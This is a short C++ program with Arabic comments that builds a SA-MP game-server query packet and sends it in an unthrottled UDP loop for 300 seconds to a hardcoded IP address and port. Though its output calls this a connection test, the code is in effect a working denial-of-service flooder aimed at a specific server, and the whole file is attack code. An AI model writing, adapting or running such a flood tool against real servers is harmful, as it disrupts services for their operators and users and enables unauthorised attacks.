#include <iostream>
#include <string>
#include <chrono>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

int main() {
    // إعدادات الهدف
    std::string target_ip = "45.138.16.253"; // الـ IP الموجود في صورتك
    int target_port = 7000;
    int duration = 300; // المدة بالثواني

    // إنشاء Socket من نوع UDP
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "فشل في إنشء الـ Socket" << std::endl;
        return 1;
    }

    sockaddr_in serv_addr;
    std::memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(target_port);
    
    if (inet_pton(AF_INET, target_ip.c_str(), &serv_addr.sin_addr) <= 0) {
        std::cerr << "عنوان IP غير صالح أو خطأ في التحويل!" << std::endl;
        close(sock);
        return 1;
    }

    // بناء حزمة استعلام SAMP
    // البنية: 'SAMP' + IP (4 bytes) + Port (2 bytes little-endian) + 'i'
    char payload[1024];
    int payload_len = 0;

    // 1. إضافة كلمة SAMP
    std::memcpy(payload, "SAMP", 4);
    payload_len += 4;

    // 2. إضافة الـ IP كبايتات حقيقية (4 بايت)
    struct in_addr ip_binary;
    inet_pton(AF_INET, target_ip.c_str(), &ip_binary);
    std::memcpy(payload + payload_len, &ip_binary, 4);
    payload_len += 4;

    // 3. إضافة البورت (2 بايت - Little Endian)
    unsigned short port_le = (unsigned short)target_port; // أو تحويل مباشر حسب الحاجة
    std::memcpy(payload + payload_len, &port_le, 2);
    payload_len += 2;

    // 4. إضافة حرف الاستعلام 'i'
    payload[payload_len] = 'i';
    payload_len += 1;

    std::cout << "جاري اختبار الاتصال مع " << target_ip << ":" << target_port << " بلغة C++..." << std::endl;

    auto start_time = std::chrono::steady_clock::now();
    auto end_time = start_time + std::chrono::seconds(duration);
    long long count = 0;

    // حلقة تكرار مفتوحة بأقصى سرعة ممكنة
    while (std::chrono::steady_clock::now() < end_time) {
        sendto(sock, payload, payload_len, 0, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
        count++;
    }

    close(sock);
    std::cout << "تم إرسال " << count << " حزمة بنجاح." << std::endl;

    return 0;
}
